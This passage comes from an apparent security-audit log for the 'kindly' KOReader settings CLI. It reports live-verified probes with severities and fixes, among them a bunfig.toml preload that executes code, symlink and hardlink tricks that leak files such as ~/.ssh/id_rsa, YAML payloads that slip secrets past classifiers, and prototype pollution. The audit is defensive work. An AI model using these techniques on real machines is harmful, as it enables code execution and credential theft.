  a detached signature; kindly embeds the public key. Release
  process signs; runtime verifies. Heaviest machinery but
  most robust; only option that defends against malicious
  upstream *releases*.

Preferred option is a one-line change in `reader.ts:123`:

```ts
const bytes = readFileSync(p);
if (hashBytes(bytes) !== CATALOG_SHA256_EXPECTED) {
    throw new KindlyError(
        ErrorCodes.CATALOG_INTEGRITY_FAIL,
        `catalog at ${p} has unexpected hash — this may indicate tampering`,
        [{ text: "Reinstall kindly from a trusted source to restore the bundled catalog." }],
    );
}
const raw = JSON.parse(bytes.toString("utf8"));
```

Plus a build/test-time step that recomputes and embeds the hash
whenever `plugins.bundled.v1.json` changes (same rig as
`scripts/extract-plugin-meta.ts`).

**Schema file (`data/schemas/settings.reader.lua.v1.json`).**
Same loader pattern (`src/schema/settings.ts:41-48`: plain
`readFileSync` + `JSON.parse`, no Zod, no integrity check). But
classify.ts's SECRET_KEYS / SENSITIVE_KEYS are **hardcoded in TS
source**, not loaded from the schema — so a poisoned schema
only weakens doctor's type-mismatch warnings, not the SECRET/
SENSITIVE gates. Lower severity, same fix shape. Bundle with
the catalog integrity fix.

---

### S69 — `--output` flag follows symlinks on `init` / `pull` / `snapshot` (LLL-probe, live-verified 2026-04-24) — **Medium**

S61 noted this surface as "self-inflicted for the user-typed flag, low
severity." LLL elevates it: the flag resolves **through** a symlink at
the target path, and three commands are exploitable with distinct
severity profiles:

| Command | Write site | Outcome |
|---------|-----------|---------|
| `kindly init --force` | `init.ts:51` `writeFileSync` | `victim.txt` overwritten with preset YAML |
| `kindly pull --force` | `pull.ts:54` `writeFileSync` | `victim.txt` overwritten with pulled YAML (SECRET-filtered but SENSITIVE-leaky) |
| `kindly snapshot` | `archive.ts:64` `tar -czf` | `victim.txt` overwritten with plaintext-SECRET fat tar |

Node `writeFileSync` uses `O_TRUNC|O_WRONLY` (no `O_NOFOLLOW`);
`existsSync` also traverses symlinks, so `--force` bypasses the
guard *against the target*. Snapshot has no existence check at all.

**Threat model.** Requires attacker with write access to the user's
cwd at the moment `kindly` runs. Realistic scenarios:

- Shared machine with multiple local users (CI runner, lab host)
- `kindly` invoked from a user-supplied working directory (e.g.,
  a sync daemon that `cd`s into watched folders)
- Post-compromise persistence: attacker pre-seeds symlinks pointing
  at privilege-escalation files (cron entries, dotfiles, SSH keys)
  and waits for the user to run any `kindly` command that defaults
  `--output` near there

**Severity ranking within the three.**

- `kindly snapshot --output /tmp/public/foo.tgz` is worst — lands
  **plaintext SECRETs** (S53 channel) at attacker's chosen path.
- `kindly pull --output` writes SECRET-filtered YAML, but the file
  overwrite itself is the primary concern (integrity, not leak).
- `kindly init --force` writes a fixed preset — integrity only.

**Fix.** Every `--output`-writing site in the four files listed in
S61 (`init.ts:43`, `lib/pull.ts:42`, `snapshot.ts:57-59`,
`lib/setupExport.ts:182-183`) runs through a `writeFileSecure(path,
bytes)` wrapper that:

1. `lstatSync(path)` — if the target is a symlink, refuse unless
   `--allow-symlink-output` (new flag, off by default).
2. `openSync(path, "wx" | "w+")` with `O_NOFOLLOW` where the Node
   binding supports it (Linux; macOS via `dangerouslyUnsupported`).
3. Fall back to `openSync(…, flags | constants.O_CREAT |
   constants.O_EXCL)` if target already exists and `--force` was not
   passed.
4. `chmod 0600` on output regardless of location (bundles with §8.9).

Folds into §8.9's `writeFileSecure` scope — no new infrastructure.

---

### S81 — `bunfig.toml` in user cwd is pre-exec RCE against every `kindly` invocation (LLL2-probe, live-verified 2026-04-24) — **High**

kindly ships as "no build step — Bun interprets TypeScript directly"
(CLAUDE.md). The default invocation shape is `bun run src/cli.ts
<cmd>` or `kindly <cmd>` where `kindly` is a script that calls `bun
run`. **Bun reads `bunfig.toml` from the current working directory
on every run**, and `bunfig.toml` supports a `preload = [...]`
directive that executes arbitrary TypeScript/JavaScript **before
kindly's `main` parses argv**.

**Live probe.**

```
/tmp/kindly-lll2-live/
├── bunfig.toml            # preload = ["./preload-evil.ts"]
└── preload-evil.ts        # writes marker, prints to stderr
```

```bash
cd /tmp/kindly-lll2-live && bun run /Users/claw/kindly/src/cli.ts --version
```

Output:

```
[LLL2] bunfig.toml preload fired — attacker RCE via cwd-resident bunfig
kindly 0.11.1
---EXIT 0---
-rw-r--r--@ 1 claw  wheel  206 Apr 24 09:09 /tmp/kindly-lll2-live/PRELOAD-FIRED.txt
```

Attacker code ran first, wrote a marker file, then kindly's
`--version` output followed. **Pre-exec RCE with exit 0** — no
scanner, no gate, no warning. Works on every kindly subcommand,
including `--help`, `--version`, and `doctor`.

**Why High severity (not Low self-inflicted).**

Threat model: attacker with write access to the user's cwd at the
moment kindly runs. Identical prerequisite to S56 / S69 / S70 /
S74 — all of which ship as Medium. LLL2 is **strictly worse**:

- S56/S70 is file-read bridging — info disclosure / integrity.
- S69 is file-write redirection — integrity / single-file clobber.
- S74 is append-oracle — audit-log forgery.
- **LLL2 is arbitrary code execution** in kindly's process before
  argv is parsed, with kindly's full permissions (mount access,
  .kindly/ write, history/trace append, device settings.reader.lua
  RW, HOME access for SSH keys / credentials / dotfiles).

Realistic scenarios identical to the S56/69/70 class:

- **Shared dev machines / CI runners.** Attacker with a regular
  account writes `bunfig.toml` in `/tmp/shared-work/`. Next user
  to `cd /tmp/shared-work/ && kindly doctor` executes attacker
  code as themselves.
- **Cloned project directories.** User clones a `kindly`-adjacent
  project (someone's shared "my Kindle setup" repo from a forum
  — exactly the S47-class sharing channel) that happens to ship
  `bunfig.toml` + a `preload.ts`. User runs `kindly apply` in
  that directory.
- **Sync daemons.** Any service that `cd`s into watched folders
  to run kindly (imagined `kindly watch` daemon, cron) hits
  every folder's `bunfig.toml`.
- **Dotfiles / project-root bunfig.** Bun documents bunfig.toml
  loading from "current working directory *and* project root".
  A kindly clone next to an attacker-owned sibling directory
  can also inherit config from the git root walk-up — needs
  probe but likely same outcome.

**Why this is not a kindly-fixable bug in the traditional sense.**
It's Bun's documented and intentional behavior — see Bun's
`bunfig.toml` docs. The upstream design assumption is "cwd is
trusted." Every Bun-based CLI tool inherits this assumption. kindly
is the one making the trust decision to *be* Bun-based.

**Fix space (three obvious candidates tested live, two rejected).**

- **REJECTED: `bun build --compile`.** Empirically tested 2026-04-
  24. Built `/tmp/kindly-lll2-live/kindly-compiled` via
  `bun build --compile /Users/claw/kindly/src/cli.ts --outfile
  kindly-compiled`; ran `./kindly-compiled --version` with the
  attacker `bunfig.toml` in cwd; **preload fired, marker written,
  `[LLL2]` banner printed**. Compiled binaries still read cwd
  bunfig at runtime. Compile-to-binary does not fix this.
- **REJECTED: `bun -c <path> run …` override.** Tested with
  `bun -c /dev/null run kindly` and `bun -c /tmp/empty-bunfig.toml
  run kindly` — in both cases cwd bunfig preload still fires
  *before* the `-c` override takes effect. The `-c` flag provides
  an additional config to merge; it does not suppress the cwd
  file.
- **PARTIAL: wrapper shell script that forces cwd.** `kindly`
  could ship as a shell wrapper that `cd`s to a known-safe
  directory (e.g., `$HOME/.kindly/safe-cwd/`) before execing
  bun. Closes LLL2 but breaks every `--mount` / `--file` /
  `--output` flag that accepts relative paths (which is all of
  them), since relative paths now resolve against the safe-cwd,
  not the user's actual cwd. Workable only if every path-
  accepting flag is pre-resolved via `path.resolve(userCwd, arg)`
  in the wrapper before exec — a real refactor.
- **MITIGATION: read cwd bunfig BEFORE invoking bun.** A wrapper
  script checks for `./bunfig.toml` and refuses to run if one
  exists and contains a `preload` entry (or checks for any
  bunfig.toml at all and warns + requires `--allow-cwd-bunfig`).
  Shell wrapper; runs before `bun run`; closes the attack
  without forcing a cwd change. Limitation: only works if the
  `kindly` entry-point is a shell script, not `bun run` invoked
  directly. For users who run `bun run src/cli.ts`, no defense.
- **DOCUMENTATION: threat-model callout.** docs/87 must name
  cwd-trust as an explicit kindly assumption, with guidance to
  invoke kindly only from directories the user controls (never
  from `/tmp/`, never from freshly-cloned repos, never from
  shared dirs). Same guidance applies to *every* Bun tool — this
  is an upstream design issue that kindly inherits.
- **UPSTREAM: file a Bun feature request for a `--no-config` or
  `BUN_CONFIG_SKIP=1` env.** Until Bun adds an explicit
  suppress-all-bunfig mode, no clean defense exists.

**Scope narrowed via follow-up probe.** Walk-up from a nested cwd
(`/tmp/kindly-lll2-live/nested/deeper/`) **does NOT fire** the
`/tmp/kindly-lll2-live/bunfig.toml` preload — Bun reads bunfig only
from the exact cwd, not from ancestors on `bun run`. kindly's own
source directory (`/Users/claw/kindly/`) ships no bunfig.toml, so
the cwd copy is authoritative when present. Still untested: (a)
whether a future compiled `kindly` binary (via `bun build
--compile`) reads cwd's bunfig.toml at runtime — the preferred fix
above assumes it does not, but that must be empirically
confirmed before committing to the fix; (b) other bunfig keys
(`[install]`, `[test]`) that may be attacker-weaponizable from
cwd.

**Scratch artifact:** `/tmp/kindly-lll2-live/` — bunfig.toml +
preload-evil.ts, runs on any `bun run <script>` from that dir.

---

### S79 — YAML `<<:` merge keys smuggle SECRET / SENSITIVE values past all classifier walks (JJJ-probe, live-verified 2026-04-24) — **High**

Third confirmed shape in the SECRET/SENSITIVE classifier-bypass
family (after S71's array-wrap and dotted-literal). The `yaml`
library (at `parseYamlSafe`, `src/fs/yamlSafe.ts:42`) **does not
resolve YAML merge keys** — the `<<:` token is stored as a literal
own-key with the alias value as its subtable. Every classify walk
iterates `Object.entries` / `Object.keys`; the key string `"<<"`
is not in `SECRET_KEYS`, not in `SENSITIVE_KEYS`, and
`SECRET_PATHS` / `SENSITIVE_PATHS` never build a path containing
`<<` because the walker descends into the subtable *via* that key,
losing parent-path context.

**Live probe.**

```yaml
creds: &creds
  userkey: "ATTACKER_USERKEY_ABCDEF"
  server: "sync.attacker.example"
kosync:
  <<: *creds
  innocent: true
```

Parsed output:

```
top-level keys: ["creds", "kosync"]
kosync keys: ["<<", "innocent"]
kosync.userkey: undefined
kosync["<<"]: { userkey: "ATTACKER_USERKEY_ABCDEF", server: "sync.attacker.example" }
has own kosync.userkey: false
classifyKey("<<") → USER
isSecretPath("kosync.<<") → false
```

**Exploit chain.**

1. Attacker ships a YAML file (via `kindly apply --file
   friend.yaml`, or nested inside a `.kset` manifest's
   `settings` block).
2. `mergeYamlIntoLua` walks `Object.entries(parsed)` → sees
   `kosync: {<<: {...}, innocent: true}` → merges normally. The
   `<<` key is treated as a regular nested subtable.
3. Classifier gates (SECRET redaction in dry-run, SENSITIVE W31
   fire on setup import) iterate own-keys, see `"<<"`, look it up
   in the path set — miss — gate doesn't fire.
4. Lua writer emits `["<<"] = {["userkey"] = "ATTACKER_…", …}`
   into `settings.reader.lua` on device.
5. **Attacker value lands on device, unredacted in backups, with
   no trust gate having fired.** KOReader's Lua sees `<<` as a
   literal string key (Lua has no merge-key semantics either) —
   `settings.kosync.userkey` is nil at runtime, so the attacker
   value doesn't hijack the real `userkey` field. But the bytes
   are *there*, in plaintext, in `settings.reader.lua` and in
   every `.kindly/backups/*/settings.reader.lua` (world-readable
   per S53 until §8.9 lands).

**Why this is the SECRET-harvesting primitive, not just a shape quirk.**
The attacker doesn't need `<<` to actually work on KOReader — they
just need the bytes to land somewhere the victim reads. `kindly
pull` will re-emit the `<<` key into the user's `kindle.yaml` on
subsequent syncs, and `kindly diff` / `--json` envelope will print
the value as `prev → next` text — exactly the stdout / JSON leak
path that S43 / S48 covered for other SECRET routes. The
redactor (§8.4) classifies by key name; `<<` isn't a SECRET key
name; it passes redaction. The attacker value now prints in
plaintext in every diff render.

**Fix space (bundles with S71).** The input-shape normalizer
proposed for S71 must also handle merge-key expansion:

```ts
function normalizeYamlInput(v: unknown): unknown {
    if (Array.isArray(v)) return v.map(normalizeYamlInput);
    if (v !== null && typeof v === "object") {
        const out: Record<string, unknown> = {};
        // Resolve merge keys first (YAML 1.1 semantics: same-key → alias value wins
        // unless explicit key already present).
        if ("<<" in v) {
            const merged = (v as Record<string, unknown>)["<<"];
            if (merged !== null && typeof merged === "object" && !Array.isArray(merged)) {
                for (const [mk, mv] of Object.entries(merged)) out[mk] = normalizeYamlInput(mv);
            }
        }
        for (const [k, val] of Object.entries(v)) {
            if (k === "<<") continue;
            // Dotted-literal → nested (S71 shape)
            if (k.includes(".")) { /* split and assign */ }
            else out[k] = normalizeYamlInput(val);
        }
        return out;
    }
    return v;
}
```

Apply at a single chokepoint (`parseYamlSafe` wrapper) so every
downstream consumer sees normalized shape. Alternative: reject
`<<` as a key entirely (YAML 1.2 technically doesn't include
merge keys in the core spec — the `yaml` library exposes them as
a 1.1 extension).

**Folds into §8.12 alongside S71** — same classifier-walk gap,
new shape. Pushes §8.12 scope wider: the normalizer must cover
array-wrap (S71a), dotted-top-level (S71c), AND merge-keys
(S79). Three shapes, one pass.

---

### S80 — Cyclic YAML anchors crash Lua writer (`RangeError`), reaching S77 as a live exploit (JJJ-probe, live-verified 2026-04-24) — **Medium**

S77 flagged "no cycle detection in Lua writer — no reachable
exploit today." JJJ-probe closes that gap: **the `yaml` library
materializes actually-cyclic in-memory graphs** from
self-referential anchors, and `dumpSettingsFile` recurses until
stack blown.

**Live probe.**

```yaml
root: &a
  child: *a
```

After `parseYamlSafe`:
- `parsed.root === parsed.root.child` → true (cycle)
- `JSON.stringify(parsed)` → `TypeError: cannot serialize cyclic
  structures`
- `mergeYamlIntoLua(parsed, {foo: "bar"})` → succeeds (object
  spread `{...onDevice, ...v}` copies top-level refs without
  recursing; cycles survive but don't blow the stack at merge
  time)
- `dumpSettingsFile(parsed)` → **`RangeError: Maximum call stack
  size exceeded`**

**Exploit chain.** Any path that takes attacker YAML → parse →
writer is now a push-button DoS:

- `kindly apply --file attacker.yaml` — merges into device
  settings, then calls `dumpSettingsFile` → RangeError → exit 1.
  No data written to device (writer throws before
  `writeFileSync`), but **every subsequent apply fails the same
  way** until the user removes the cyclic YAML. Chains with an
  attacker who's convinced the user to run apply on a trusted-
  looking YAML bundle.
- `kindly setup import` on a `.kset` whose `settings:` block is
  cyclic — same path, same crash.
- `kindly init` from a seed YAML — probably safe (init doesn't
  write settings, it writes a default YAML template), but needs
  audit.

**Severity delta.** S77 at time of write: "Low, defense-in-depth,
no reachable exploit." Post-JJJ: **Medium, confirmed reachable**.
The fix remains the same (WeakSet seen-tracker in `serializeTable`
+ depth cap 64), but it moves from "nice-to-have hardening" to
"required to close S80".

**Secondary victim: the input-shape normalizer proposed for S79**
MUST handle cycles without infinite recursion — attacker could
otherwise DoS the normalizer itself. Either detect cycle at
normalizer entry (WeakSet) or run normalizer over a
structured-cloned copy.

**Fix folds into §8.12** (parser / shape guards) and §8.17-style
input defense. S77's existing writer-side fix is sufficient;
JJJ-B just proves the attack surface is real.

---

### S74 — `.kindly/history.jsonl` and `.kindly/trace.jsonl` follow symlinks on read, write, and append (CCC-probe, live-verified 2026-04-24) — **Medium**

Three sites on `.kindly/` state files skip symlink checks entirely:

| Path | File:line | Behavior |
|------|-----------|----------|
| History read | `src/history/reader.ts:59` (`readFileSync(path, "utf8")`) | Follows — parsed and rendered as history entries |
| History write | `src/history/writer.ts:169` (`openSync(p, "a")`) | Follows — appends JSON lines to symlink target |
| Trace write | `src/cli/trace.ts:60` (`appendFileSync(file, …)`) | Follows — appends trace entries to symlink target |

Zero `lstatSync` / `O_NOFOLLOW` in any of the three files. The
unpack/extract sites (`src/setup/unpack.ts:86, 126`) that *do* check
are on a different surface (archive extraction, S50 scope).

**Live probe.** Attacker with write access to user cwd replaces
`.kindly/history.jsonl` with a symlink pointing at a target file in
the user's filesystem. Every subsequent `kindly` mutation (`apply` /
`setup import` / `rollback` / `restore`) appends a JSON history line
to the target. `kindly history` + `kindly rollback --to N` both
read through the symlink, treating the linked file's contents as
history data.

**Primary harm: append oracle.** Attacker-controllable JSON content
(label, command, path fragments) is appended to arbitrary
user-writable files. Chained paths include:
- `~/.ssh/authorized_keys` → JSON line won't parse as a key, but the
  append may wedge OpenSSH's strict-parser config cluster.
- `~/.config/*/config.json` files → valid-looking JSON line inserted
  into a config the attacker shouldn't be able to touch.
- Log-monitored files (syslog forwarder drops, journald inputs) →
  fabricate events.

**Secondary harm: history read corruption.** Symlink replacement
between mutations lets attacker feed the reader a crafted file;
combined with S63 (no Zod validation on history lines), `kindly
rollback --to N` resolves to attacker-chosen `snapshot_dir` — fourth
tar-ingestion RCE path opened by a symlink swap.

**Scope.** Same threat model as S56 (attacker with write access to
user cwd). S56/S70 closed the `settings.reader.lua` side; this
probe extends the same pattern to the `.kindly/` cluster. Trace
file is append-only, no read path → no RCE, but the append-oracle
harm stands.

**Fix.** Shared helper `writeFileSecure` / `openAppendSecure` in
`src/fs/safeWrite.ts`:

- `lstatSync(path)` on existing targets — reject symlinks unless an
  opt-in flag is passed (not exposed for `.kindly/` state).
- `openSync(…, O_NOFOLLOW)` on Linux; macOS falls back to
  `lstat`-then-open (TOCTOU window accepted, same as bsdtar).
- All three `.kindly/` sites switch to the helper.

Bundles with §8.9 (`.kindly/` permissions hardening) and the
S56/S70 `lstat`-guard landing at all 8 settings-read sites. One
consistent helper, seven call sites across three files.

---

### S75 — gzip multi-member archive under-reports uncompressed size to `enforceSizeCaps` (BBB-probe, live-verified 2026-04-24) — **Low**

`src/fs/archive.ts:136` shells `gzip -l <archive>` and parses the
two-column output (compressed, uncompressed). `gzip -l` only reports
the **last** member's ISIZE when the archive is multi-member
(legitimate per RFC 1952 — gzip concatenation produces a valid
single archive). `enforceSizeCaps:153-183` then gates against that
single trailer's ISIZE — every non-final member's uncompressed
bytes are invisible to the cap.

**Live probe.** Crafted an 11-member `.tar.gz`: 10 × 7 KB tar
payload members + 1 × 4 KB tail decoy. `gzip -l` reported **4 KB
uncompressed**; true uncompressed across all members was **70 KB**
(17× undercount). A 500 MB-capped setup would admit a ~8.5 GB
attacker archive if the tail decoy reports small.

**Why severity is Low, not High (unlike S68 wrap).** Both bsdtar
(`tar -xzf`) and GNU tar stop extracting at the first embedded tar
EOF marker. Subsequent gzip members are decompressed through the
pipe but their tar entries never hit disk. So the bypass is a **CPU
+ transient memory DoS**, not a file-write amplification. S68's 4
GiB ISIZE wrap *does* land on disk through `tar -xzf` and is the
real bomb bypass; BBB is noisier and narrower.

**Fix.** Tightly scoped: in `readGzipSizes`, reject any archive
whose content has the gzip magic `1f 8b` at any offset beyond byte
0. Pure-JS scan of the archive bytes; rejects multi-member gzip
outright. Legitimate `.tar.gz` workflows never produce multi-member
archives (only specialized tooling like `pigz --rsync` does). One
belt-and-suspenders companion to the S68 stream-counting sink.

Folds into §8.15 (stream-counting bomb cap) — same file, same
function, adjacent fix.

---

### S76 — BOM-prefixed settings file: KOReader accepts, kindly fails (FFF-2-probe, live-verified 2026-04-24) — **Low**

`src/lua/reader.ts` `skipWS` recognizes ASCII whitespace + `--`
comments only. UTF-8 BOM (`EF BB BF`, U+FEFF) is not stripped.
LuaJIT 2.1 strips BOM automatically before parsing. Divergence
table:

| Fixture | kindly | KOReader (LuaJIT) | Verdict |
|---------|--------|-------------------|---------|
| Zero-byte file | `LuaParseError`, exit 1 | `dofile` → nil, fallback to `.old` | Both reject (correct) |
| BOM only (3 bytes) | `LuaParseError`, exit 1 | BOM strip → nil → fallback | Both reject (correct) |
| BOM + `return {…}` | `LuaParseError`, exit 1 | BOM strip → parses fine | **Divergence** |

**Practical primitive.** User edits `settings.reader.lua` in an
editor that emits a BOM (historical Windows Notepad default,
various legacy editors). File opens fine on the Kindle — KOReader
starts, settings load, user reads normally. **Every kindly command
fails with `LuaParseError`** because the first three bytes confuse
the parser's `skipWS` expectation of ASCII characters.

**Severity Low.** No privilege escalation, no code exec, no data
exfil. But it's a **kindly-only** failure mode — the user sees
"kindly is broken on my device that works perfectly in KOReader"
and reasonably concludes kindly is the problem. Support cost,
trust erosion, no workaround short of hex-editing the settings
file.

**Fix (one line at `parseSettingsFile` entry).**

```ts
export function parseSettingsFile(src: string): LuaValue {
    if (src.charCodeAt(0) === 0xFEFF) src = src.slice(1);
    return new Parser(src).parseFile();
}
```

Alternatively extend `skipWS` to recognize `U+FEFF` as
whitespace (matches LuaJIT's behavior more precisely). Either is
fine; the leading-strip is simpler.

Folds into §8.12 as a single additional bullet — same file, same
function.

---

### S77 — No cycle detection in Lua writer (EEE-2-probe, live-verified 2026-04-24) — **Low (defense-in-depth)**

`src/lua/writer.ts` `serializeValue → serializeTable →
serializeValue` has zero cycle protection — no `WeakSet`, no depth
cap, no seen-tracker. A cyclic `LuaValue` produces `RangeError:
Maximum call stack size exceeded`. Live probe confirmed with
direct self-reference, indirect 3-node cycle, and via the public
`dumpSettingsFile` wrapper.

**`mergeYamlIntoLua` path is clean (audited 2026-04-24).**
`src/schema/yaml.ts:108-128` uses `{...onDevice}` / `{...existing,
...v}` object spreads — fresh objects, no shared references.
Inputs come from separate parsers (Lua reader + YAML parser) that
produce acyclic trees.

**Practical risk Low today.** All current inputs pass through text
parsers that structurally can't emit cycles. No attacker-reachable
code path constructs a cyclic `LuaValue`. Severity is
defense-in-depth: a future refactor that reuses references (e.g.,
a single source-of-truth object referenced in multiple merge
positions) would produce a silent stack overflow instead of a
diagnostic error.

**Fix.** Add a `WeakSet<object>` seen-set + depth counter to
`serializeTable` — reject entry on cycle or depth > 64 (pairs
with S60's reader-side cap for symmetry). Folds into §8.12.

---

### S78 — Concurrent snapshot / backup directory-stamp collision silently overwrites (GGG-2-probe, live-verified 2026-04-24) — **Low**

Sibling to EEE (history.jsonl index-collision) and EEE-probe
(backup rotation race), but for the **directory-stamp** itself, not
the index field. Four sites use millisecond-ISO timestamps as
directory / filename components with no randomness suffix:
`src/fs/safeWrite.ts:74`, `src/commands/snapshot.ts:59`,
`src/commands/restore.ts:120`, `src/lib/importSetup.ts:712`.
`mkdirSync({recursive:true})` silently merges; `copyFileSync`
silently overwrites without `COPYFILE_EXCL`. The `"wx"` exclusive-
create at `safeWrite.ts:85` protects the `.tmp` write target, not
the backup directory.

**Live probe.** 20 concurrent `safeWrite` calls produced only 8
unique backup directories — 12 archived-pre-write copies silently
clobbered. 5 concurrent `kindly snapshot` invocations produced 4
`.tar.gz` files — 1 clobbered.

**Severity Low for Kindle workflow** (`--mount` invocations are
user-sequential). **Medium-adjacent for the docs/97 GUI + `kindly
watch` vision** — once mutations fire concurrently (cron, watch
daemon, GUI event loop, parallel fixture tests in CI), lost
backups become routine. Combined with S67 (no file-lock on
settings) this is the backup-side hole that makes a lost-write
race unrecoverable.

**Fix.** Append a random suffix to every stamp:

```ts
const stamp = `${new Date().toISOString().replace(/[:.]/g, "-")}-${randomBytes(3).toString("hex")}`;
```

6 hex chars ≈ 1-in-16M collision; round-trip readability
preserved. Secondary: use `COPYFILE_EXCL` flag on the
`copyFileSync` and retry on `EEXIST`. Bundles with S67's file-lock
fix (§8.14) — same file (`safeWrite.ts`), adjacent concern.

---

### S73 — JS prototype-pollution in Lua reader diverges parser output from KOReader's dofile (III-probe, live-verified 2026-04-24) — **Medium**

`src/lua/reader.ts:257` assigns `obj[key] = val` on a plain
`Record<string, LuaValue>` (`obj = {}` at line 232). When `key ===
"__proto__"`, this triggers the built-in `__proto__` **setter** on
`Object.prototype`, swapping the object's prototype instead of
creating an own property. KOReader's Lua `dofile` has no prototype
semantics — `["__proto__"] = {...}` stores a subtable under the
literal string key `"__proto__"`. The two parsers produce
structurally different in-memory representations of the same source.

**Live probe.** `/tmp/kindly-iii-live/probe.ts` ran four cases
through `parseSettingsFile`:

- **Case A** — `{["__proto__"] = {terminal_shell = "/bin/attacker",
  home_dir = "/tmp/attacker"}, refresh_rate = 5}`:
  - `Object.keys(parsed)` → `["refresh_rate"]` (payload hidden)
  - `Object.getPrototypeOf(parsed) === Object.prototype` → `false`
    (prototype swapped)
  - `parsed.terminal_shell` → `"/bin/attacker_shell"` (direct
    property lookup finds payload via chain)
  - `"terminal_shell" in parsed` → `true` (`in` operator walks chain)
  - `parsed.hasOwnProperty("terminal_shell")` → `false` (own-check
    fails)
  - `JSON.stringify(parsed)` → `{"refresh_rate":5}` (serializer
    skips inherited)
- **Case B** — own property and prototype both carry `terminal_shell`:
  own wins on lookup; `Object.keys` surfaces only own.
- **Case C** — prototype carries `hasOwnProperty = "poisoned"`:
  successful pollution (method overridden on chain).
- **Case D** — prototype carries `constructor = "poisoned"`:
  successful pollution.

**Exploit-chain analysis — why this is Medium, not High.**

Kindly's codebase walks enumerable own-keys everywhere:

- `src/schema/classify.ts:113, 116` — SENSITIVE/SECRET detection
  via `Object.entries`/`Object.keys` → misses prototype payload
- `src/schema/yaml.ts:36, 48, 87, 113, 150, 157, 166` —
  `luaToYaml` + `mergeYamlIntoLua` via `Object.entries` → drops
  prototype payload from emitted YAML and from merged Lua
- `src/lua/writer.ts:83` — `serialize` via `Object.entries` →
  prototype payload **never written back to device**

Net effect: a crafted `settings.reader.lua` with
`["__proto__"] = {terminal_shell = v}` produces:

1. kindly's `pull`/`diff`/`setup inspect` **don't see** the payload
   in output YAML or diff renderers — classifier walks skip it.
2. kindly's `apply` writes back clean Lua **without** the payload —
   silently strips attacker fields from device on next apply.
3. KOReader's `dofile`, which treats `__proto__` as a literal string
   key, stores it as a subtable — `settings["terminal_shell"]`
   returns `nil` at top level, so Terminal's `shell` lookup is
   **also unaffected**.

The payload cannot directly smuggle a SENSITIVE value onto the
device via kindly (writer blocks it), and cannot directly trigger
attacker code on KOReader (Lua has no proto chain to exploit). But
it is a genuine **parser divergence** with three second-order
consequences:

- **Silent device-state mutation.** If the device ever acquires a
  settings file with prototype keys (via direct KOReader write,
  community forum `.kset`, or a future kindly write path that
  doesn't happen to call `Object.entries`), kindly's next `apply`
  destroys them. Integrity invariant broken: "apply is
  non-destructive on unmodified keys."
- **Defense-in-depth regression risk.** The current safety is
  accidental — every layer happening to use own-key walks. Any
  future code change that uses `in`, direct property access on a
  dynamic key, `for...in`, or Lodash's `_.get` would see the
  payload. The parser is returning an unsafe-by-default value.
- **Downstream method pollution.** Case C/D show
  `hasOwnProperty` and `constructor` are attacker-reachable on the
  prototype chain. If any future kindly code calls
  `parsedSettings.hasOwnProperty(...)` (instead of
  `Object.prototype.hasOwnProperty.call`), it returns the attacker
  string and the subsequent `.call(...)`/`.apply(...)` throws
  `TypeError: X is not a function` — DoS of that code path. Same
  for `.toString()`, `.valueOf()`, `.constructor`.

**Not a full HTTP-smuggling-equivalent exploit today.** The writer
drops the payload before it round-trips. But the fix is cheap and
the bug class is exactly the one that reliably bites codebases at
the N+1th refactor.

**Fix (cheapest).** In `src/lua/reader.ts:232`, replace
`const obj: Record<string, LuaValue> = {};` with
`const obj: Record<string, LuaValue> = Object.create(null);`.
Prototype is gone entirely; `obj["__proto__"] = v` stores as a
regular own-key. Downstream `Object.entries(obj)` now includes
`__proto__`. Classifier, writer, YAML emitter all see it — same
traversal, now including the previously-hidden slot.

Alternative: **explicit reject** of `__proto__` / `constructor` /
`prototype` keys at parse time. Slightly chattier, catches
malicious intent directly instead of normalizing it away.

Folds into §8.12 (parser & shape guards) — same file, same
`parseTable` function, one-line change. No flag gate, no migration
concern (no legitimate settings file has a `__proto__` key).

---

### S70 — Hardlink on mount-side `settings.reader.lua` exfiltrates host file through pull + backup (OOO-probe, live-verified 2026-04-24) — **Medium**

Sibling to S56 (symlink) but via a **distinct primitive that S56's
proposed `lstatSync.isSymbolicLink()` fix does NOT close**. Hardlinks
share an inode — there is no "link" to detect at the directory-entry
level; `lstat` on the mount-side path reports a regular file with
`nlink > 1`.

**Confirmed mechanism.**

1. Attacker plants `Kindle/koreader/settings.reader.lua` as a
   hardlink to `$HOME/.ssh/id_rsa` (or any user-readable file —
   APFS/ext4 allow hardlinks within a mounted filesystem; FAT32 on
   real Kindle does not, but the desktop KOReader live-head target
   uses APFS).
2. `kindly pull --mount …` reads through `readFileSync`
   (`pull.ts:36`) → host file content lands in output YAML.
   `HARDLINK_SENTINEL` from the probe surfaced verbatim.
3. `safeWrite.ts:78` `copyFileSync(path, backupPath)` also copies
   host content into `.kindly/backups/<ts>/settings.reader.lua` —
   second exfiltration channel, persists across `.kindly` rotation
   (kept 20 backups by default).

**Write side is safe (by accident).** `safeWrite.ts:103`'s
`renameSync(path, oldPath)` followed by `renameSync(tmpPath, path)`
breaks the hardlink — new inode for `path`, host file preserved.
But **`settings.reader.lua.old` retains the hardlink for one apply
cycle**, so `safeWrite`'s rollback branch (`:136-139`: unlink path,
rename `.old` → path) re-promotes the hardlink into the live file.
Narrow window, but present.

**Detection.** `st.nlink > 1` on the mount-side settings file in
any of the 8 read sites enumerated in S56. Reject with
`refusing hardlinked settings.reader.lua (nlink=N) — this path
should be a regular file with nlink=1`. Same fix location as S56;
`lstatSync` already called at that site, just add the nlink check.

**Severity.** Lower than S56 because (a) requires attacker with
same-filesystem write access (no cross-filesystem hardlinks —
can't link from an attacker-controlled drive), (b) `.old`
hardlink window is narrow. But the exfiltration primitive through
pull + backup is real and does not require a race.

---

### S71 — SECRET / SENSITIVE classifiers bypassed by YAML array wrapping and literal dotted-top-level keys (RRR-probe, live-verified 2026-04-24) — **High**

Three variants probed; **two confirmed leaks**, one clean.

| Variant | YAML shape | Verdict | Root cause |
|---------|-----------|---------|------------|
| A: kosync-as-array | `settings.kosync: [{userkey: "…"}]` | **LEAK** | `classify.ts:248` `!Array.isArray(v)` short-circuits recursion into array elements — SECRET_PATHS walk skips the array's object children |
| B: userkey as nested object | `settings.kosync: {userkey: {nested: "…"}}` | CLEAN | `isSecretPath` fires regardless of value type |
| C: literal dotted top-level key | `settings["kosync.userkey"]: "…"` | **LEAK** | `classify.ts:158` `classifyKey` never consults `SECRET_PATHS`, only `SECRET_KEYS` — dotted-literal is a single key from Zod's perspective, not a two-segment path |

**Bonus.** Same array-bypass exists in `collectSensitiveFromSettings`
(`classify.ts:115`) and `findSensitiveInValue` (`classify.ts:188`)
